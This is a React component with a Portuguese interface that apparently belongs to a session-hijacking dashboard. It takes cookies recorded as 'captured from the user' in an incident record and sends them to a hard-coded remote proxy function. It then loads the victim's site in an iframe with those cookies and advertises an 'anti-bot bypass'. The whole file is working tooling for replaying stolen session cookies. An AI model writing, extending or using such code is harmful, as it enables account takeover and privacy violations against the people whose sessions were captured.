import { useState, useEffect, useRef } from "react";
import { Globe, RefreshCw, ExternalLink, AlertCircle } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

interface LiveSiteViewerProps {
  incident: {
    id: string;
    host: string;
    tab_url?: string;
    cookie_data?: any;
    full_cookie_data?: any;
  };
  onClose: () => void;
}

export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
  const [proxyUrl, setProxyUrl] = useState<string | null>(null);
  const [srcDoc, setSrcDoc] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [cookies, setCookies] = useState<any[]>([]);
  const [currentUrl, setCurrentUrl] = useState<string | null>(null);
  const [iframeKey, setIframeKey] = useState(0);
  const readyTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    // Try to get cookies from multiple sources (both snake_case and camelCase)
    const cookieSource = incident.full_cookie_data 
      || incident.cookie_data 
      || (incident as any).cookie_excerpt 
      || (incident as any).cookieExcerpt;
    
    if (cookieSource) {
      try {
        let parsedData;
        
        if (typeof cookieSource === 'string') {
          // Try JSON parse first
          try {
            parsedData = JSON.parse(cookieSource);
          } catch {
            // If JSON parse fails, try parsing as cookie string format: "name=value; name2=value2"
            if (cookieSource.includes('=')) {
              parsedData = cookieSource.split(';').map(pair => {
                const [name, ...valueParts] = pair.trim().split('=');
                return {
                  name: name.trim(),
                  value: valueParts.join('=').trim(),
                  domain: incident.host,
                  path: '/'
                };
              }).filter(c => c.name && c.value);
            }
          }
        } else {
          parsedData = cookieSource;
        }

        // Convert different cookie data formats to standard format
        let cookieArray = [];
        
        if (Array.isArray(parsedData)) {
          // Already in array format - filter out invalid entries
          cookieArray = parsedData
            .filter(c => c && typeof c === 'object' && c.name && c.value && c._type !== 'undefined')
            .map(c => ({
              ...c,
              domain: c.domain || incident.host,
              path: c.path || '/'
            }));
        } else if (parsedData && typeof parsedData === 'object') {
          // Convert object format {name: value} to array format
          cookieArray = Object.entries(parsedData)
            .filter(([name, value]) => name && value && value !== 'undefined')
            .map(([name, value]) => ({
              name,
              value: String(value),
              domain: incident.host,
              path: '/'
            }));
        }
        
        console.log('[LiveSiteViewer] Parsed cookies:', cookieArray.length, 'cookies');
        setCookies(cookieArray);
      } catch (error) {
        console.error('Error parsing cookie data:', error);
        setCookies([]);
      }
    } else {
      setCookies([]);
    }
  }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);

  // Listen for navigation and ready messages from iframe
  useEffect(() => {
    const handleMessage = async (event: MessageEvent) => {
      // Handle proxy:ready signal
      if (event.data?.type === 'proxy:ready') {
        console.log('[LiveSiteViewer] ✅ proxy:ready recebido para:', event.data.url);
        if (readyTimeoutRef.current) {
          clearTimeout(readyTimeoutRef.current);
          readyTimeoutRef.current = null;
        }
        return;
      }
      
      // Handle navigation
      if (event.data?.type === 'proxy:navigate') {
        const { url, incidentId } = event.data;
        
        if (incidentId !== incident.id) return;
        
        console.log('[LiveSiteViewer] proxy:navigate →', url);
        setError(null);
        setCurrentUrl(url);
        
        try {
          const proxyBase = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';
          
          const response = await fetch(proxyBase, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              url, 
              incidentId: incident.id, 
              cookies, 
              forceHtml: true 
            })
          });
          
          if (response.ok) {
            const html = await response.text();
            console.log('[LiveSiteViewer] POST OK → srcDoc atualizado');
            
            // Clear any existing timeout
            if (readyTimeoutRef.current) {
              clearTimeout(readyTimeoutRef.current);
            }
            
            // Force iframe remount and set new content
            setIframeKey(k => k + 1);
            setSrcDoc(html);
            setProxyUrl(null);
            
            // Setup ready timeout with Blob URL fallback
            console.log('[LiveSiteViewer] srcDoc set → aguardando proxy:ready…');
            readyTimeoutRef.current = window.setTimeout(() => {
              console.warn('[LiveSiteViewer] ⚠️ timeout → usando Blob URL fallback');
              const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
              const blobUrl = URL.createObjectURL(blob);
              setSrcDoc(null);
              setProxyUrl(blobUrl);
              setIframeKey(k => k + 1);
            }, 3000);
            
            toast.success('Página carregada');
          } else {
            throw new Error(`Failed to load: ${response.status}`);
          }
        } catch (err: any) {
          console.error('[LiveSiteViewer] Navigation error:', err);
          setError(err.message || 'Erro ao navegar');
          toast.error('Falha ao carregar página');
        }
      }
    };
    
    window.addEventListener('message', handleMessage);
    return () => {
      window.removeEventListener('message', handleMessage);
      if (readyTimeoutRef.current) {
        clearTimeout(readyTimeoutRef.current);
      }
    };
  }, [incident.id, cookies]);

  const loadSiteWithCookies = async () => {
    if (!incident.tab_url) {
      setError('URL do site não disponível');
      return;
    }

    setError(null);

    try {
      console.log('Loading site with cookies:', incident.tab_url, cookies);

      const proxyBase = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';
      setSrcDoc(null);

      // 1) Tenta via POST e injeta no srcDoc (mais robusto)
      const postResp = await fetch(proxyBase, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: incident.tab_url, incidentId: incident.id, cookies, forceHtml: true })
      });

      if (postResp.ok) {
        const text = await postResp.text();
        console.log('[LiveSiteViewer] POST renderizado como HTML');
        
        // Clear any existing timeout
        if (readyTimeoutRef.current) {
          clearTimeout(readyTimeoutRef.current);
        }
        
        // Force iframe remount and set content
        setIframeKey(k => k + 1);
        setSrcDoc(text);
        setProxyUrl(null);
        setCurrentUrl(incident.tab_url);
        
        // Setup ready timeout with Blob URL fallback
        console.log('[LiveSiteViewer] srcDoc set → aguardando proxy:ready…');
        readyTimeoutRef.current = window.setTimeout(() => {
          console.warn('[LiveSiteViewer] ⚠️ timeout → usando Blob URL fallback');
          const blob = new Blob([text], { type: 'text/html;charset=utf-8' });
          const blobUrl = URL.createObjectURL(blob);
          setSrcDoc(null);
          setProxyUrl(blobUrl);
          setIframeKey(k => k + 1);
        }, 3000);
        
        toast.success('Site renderizado via proxy');
        return;
      } else {
        console.warn('⚠️ POST falhou, fallback para GET.', postResp.status);
      }

      // 2) Fallback via GET com forceHtml
      const encodedUrl = encodeURIComponent(incident.tab_url);
      const cacheBuster = Date.now();
      const url = `${proxyBase}?url=${encodedUrl}&incident=${incident.id}&_t=${cacheBuster}&forceHtml=1`;
      console.log('🌐 Loading URL com cache buster (forceHtml):', url);
      setProxyUrl(url);
      toast.success('Site carregado com proxy universal ativo');

    } catch (err: any) {
      console.error('Error loading site:', err);
      setError(err.message || 'Erro ao carregar site');
      toast.error('Falha ao carregar site com cookies');
    }
  };

  const refreshSite = () => {
    setProxyUrl(null);
    setSrcDoc(null);
    setTimeout(() => loadSiteWithCookies(), 100);
  };

  const openInNewTab = () => {
    const urlToOpen = currentUrl || incident.tab_url;
    if (urlToOpen) {
      window.open(urlToOpen, '_blank');
    }
  };

  return (
    <Card className="w-full h-full flex flex-col">
      <CardHeader className="pb-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Globe className="h-5 w-5 text-primary" />
            <CardTitle className="text-lg">Visualizar Site com Cookies</CardTitle>
          </div>
          <Button variant="outline" size="sm" onClick={onClose}>
            Fechar
          </Button>
        </div>
        
        <div className="flex items-center gap-2 text-sm text-muted-foreground flex-wrap">
          <span className="font-medium">Host:</span>
          <span>{incident.host}</span>
          {cookies.length > 0 && (
            <Badge variant="secondary" className="ml-2">
              {cookies.length} cookies • Anti-bot bypass
            </Badge>
          )}
          {proxyUrl && (
            <Badge variant="outline" className="ml-2 text-primary border-primary">
              Proxy Universal • Imagens + CSS + JS
            </Badge>
          )}
        </div>

        <div className="flex items-center gap-2 mt-2">
          <Button
            onClick={loadSiteWithCookies}
            disabled={!incident.tab_url}
            size="sm"
            className="gap-2"
          >
            <Globe className="h-4 w-4" />
            Carregar com Cookies
          </Button>
          
          {proxyUrl && (
            <Button
              onClick={refreshSite}
              variant="outline"
              size="sm"
              className="gap-2"
            >
              <RefreshCw className="h-4 w-4" />
              Atualizar
            </Button>
          )}
          
          <Button
            onClick={openInNewTab}
            variant="outline"
            size="sm"
            className="gap-2"
          >
            <ExternalLink className="h-4 w-4" />
            Abrir Original
          </Button>
        </div>
      </CardHeader>

      <CardContent className="flex-1 p-0">
        {error && (
          <Alert variant="destructive" className="m-4">
            <AlertCircle className="h-4 w-4" />
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}

        {srcDoc && (
          <iframe
            key={`srcdoc-${iframeKey}`}
            srcDoc={srcDoc}
            className="w-full h-full border-0"
            sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
            title={`Site: ${incident.host}`}
            onLoad={() => console.log('[LiveSiteViewer] Iframe srcDoc carregado')}
            onError={(e) => console.error('[LiveSiteViewer] Iframe srcDoc erro:', e)}
          />
        )}

        {!srcDoc && proxyUrl && (
          <iframe
            key={`proxy-${iframeKey}`}
            src={proxyUrl}
            className="w-full h-full border-0"
            sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
            title={`Site: ${incident.host}`}
            onLoad={() => console.log('[LiveSiteViewer] Iframe carregado via URL')}
            onError={(e) => console.error('[LiveSiteViewer] Iframe URL erro:', e)}
          />
        )}

        {!proxyUrl && !error && (
          <div className="flex items-center justify-center h-64 text-center">
            <div>
              <Globe className="h-12 w-12 mx-auto mb-4 text-muted-foreground" />
              <p className="text-muted-foreground mb-2">
                Clique em "Carregar com Cookies" para visualizar o site
              </p>
              <p className="text-sm text-muted-foreground">
                O site será carregado com os cookies capturados do usuário
              </p>
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
};